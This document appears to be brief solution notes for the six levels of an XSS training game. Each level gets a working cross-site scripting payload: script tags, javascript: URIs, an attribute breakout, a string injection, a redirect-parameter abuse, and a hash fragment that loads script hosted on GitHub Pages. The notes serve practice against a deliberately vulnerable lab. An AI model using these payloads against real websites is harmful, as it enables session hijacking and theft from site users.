https://xss-game.appspot.com/  

Level 1: No stipping  
`<script>alert()</script>`  

Level 2: Script stripping  
`<a href="javascript:alert()">click</a>`  

Level 3: No input  
in address page  
`'><a href="javascript:alert()">click</a>`   

Level 4: some input   
`1111');+alert('`      

Level 5: uri controls   
`signup?next=confirm => signup?next=javascript:alert()`   

Level 6:  
create a file `alert.js` with the only `alert()` function and host it on the github pages and change the link  
`https://xss-game.appspot.com/level6/frame#HTTPS://github.com/Evedel/HackTheBox/alert.js`  